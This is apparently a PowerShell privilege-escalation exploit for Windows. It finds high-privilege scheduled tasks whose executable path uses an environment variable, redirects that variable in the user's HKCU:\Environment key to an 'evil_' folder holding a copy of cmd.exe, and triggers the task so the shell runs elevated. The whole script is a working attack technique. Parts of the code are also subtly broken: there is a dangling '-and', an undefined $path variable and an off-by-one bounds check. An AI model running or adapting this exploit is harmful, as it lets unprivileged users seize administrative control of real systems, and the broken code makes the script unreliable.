$tasks = Get-ScheduledTask | 
    Where-Object { $_.Principal.RunLevel -ne "Limited" -and 
                   $_.Principal.LogonType -ne "ServiceAccount" -and 
                   $_.State -ne "Disabled" -and 
                   #$_.Principal.id -eq "Authenticated Users" -and 
                   $_.Actions[0].execute -match "\%[a-z0-9_.-]*\%[a-z0-9_.-]*"}

$task = Get-ScheduledTask | Where-Object {$_.Actions[0].execute -match "\%[a-z0-9_.-]*\%[a-z0-9_.-]*" -and
                                          $_.Principal.id -eq "Authenticated Users" -and}

Write-Host "Tasks available to exploit:"
for($i=0;$i -lt $tasks.length;$i++){
$taskName = $tasks[$i].TaskName
    Write-Host "[$i] - $taskName"
}
Write-Host -NoNewline "Select Task number: "
 [Int]$taskNumber = Read-Host
 
 if($taskNumber -gt $tasks.length -or $taskNumber -lt 0){
    Write-Warning "Opción invalida. Saliendo..."
    exit
    }

 $task = $tasks[$taskNumber]
 $taskPath = $task.TaskPath + $task.TaskName

 $fullPath = $task.Actions[0].Execute
 $path -match "\%[a-z0-9_.-]*\%"
 $enviromantVariable = $matches[0]
 $enviromentVariableName = $enviromantVariable -replace '%','' 
 $fakePath = "C:\evil_" + $task.TaskName
 $newPath = $fullPath.replace($enviromantVariable,$fakePath)
 
 $folderPath = Split-Path $newPath

 New-Item -Path $folderPath -ItemType directory -Force

 $powershell = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
 $cmd = "C:\WINDOWS\system32\cmd.exe"

 Copy-Item $cmd -Destination $newPath -Force

 New-ItemProperty -Path "HKCU:\Environment" -Name $enviromentVariableName -Value $fakePath -Force

 "schtasks /Run /TN $taskPath /I" | IEX
